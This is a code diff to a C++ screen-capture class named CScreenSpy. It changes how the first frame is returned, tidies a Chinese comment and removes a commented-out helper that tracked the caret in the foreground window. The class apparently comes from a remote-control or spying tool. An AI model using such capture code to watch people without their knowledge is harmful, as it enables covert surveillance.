@@ -92,6 +92,9 @@ CScreenSpy::~CScreenSpy()
 
 LPVOID CScreenSpy::getFirstScreen(LPDWORD lpdwBytes)
 {
+    *lpdwBytes = m_lpbmi_full->bmiHeader.biSizeImage;
+    return m_lpvLastBits;
+#if 0
     if (lpdwBytes == NULL || m_changedBuffer == NULL)
         return NULL;
 
@@ -124,6 +127,7 @@ LPVOID CScreenSpy::getFirstScreen(LPDWORD lpdwBytes)
     *lpdwBytes = m_changedOffset;
     QueryPerformanceCounter(&m_liLast);
     return m_changedBuffer;
+#endif
 }
 
 LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
@@ -345,7 +349,8 @@ LPBITMAPINFO CScreenSpy::ConstructBitmapInfo(int biBitCount, int biWidth, int bi
     /*
     Windows 95和Windows 98：如果lpvBits参数为NULL并且GetDIBits成功地填充了BITMAPINFO结构，那么返回值为位图中总共的扫描线数。
 
-    Windows NT：如果lpvBits参数为NULL并且GetDIBits成功地填充了BITMAPINFO结构，那么返回值为非0。如果函数执行失败，那么将返回0值。Windows NT：若想获得更多错误信息，请调用callGetLastError函数。
+    Windows NT：如果lpvBits参数为NULL并且GetDIBits成功地填充了BITMAPINFO结构，那么返回值为非0。如果函数执行失败，那么将返回0值。
+    Windows NT：若想获得更多错误信息，请调用callGetLastError函数。
     */
 
     HDC	hDC = GetDC(NULL);
@@ -388,7 +393,9 @@ void CScreenSpy::setCaptureLayer(BOOL bIsCaptureLayer)
         dwRop |= CAPTUREBLT;
     InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
 }
+
 bool SwitchInputDesktop();
+
 BOOL CScreenSpy::SelectInputWinStation()
 {
     BOOL bRet = ::SwitchInputDesktop();
@@ -398,27 +405,3 @@ BOOL CScreenSpy::SelectInputWinStation()
     }
     return bRet;
 }
-
-// 当前输入的热点
-// LONG CScreenSpy::getKeyBoardHotspotY()
-// {
-// 	static	DWORD	dwCurrentThreadId = GetCurrentThreadId();
-// 	static	HWND	hWindow = GetForegroundWindow();
-// 	static	DWORD	dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
-// 	HWND	hCurrentWindow = GetForegroundWindow();
-// 	if (hCurrentWindow != hWindow )
-// 	{
-// 		// Release
-// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, FALSE);
-// 		hWindow = hCurrentWindow;
-// 		dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
-// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, TRUE);
-// 	}
-//
-// 	POINT	pt;
-// 	if (GetCaretPos(&pt))
-// 	{
-// 		ClientToScreen(GetFocus(), &pt);
-// 	}
-// 	return pt.y;
-// }
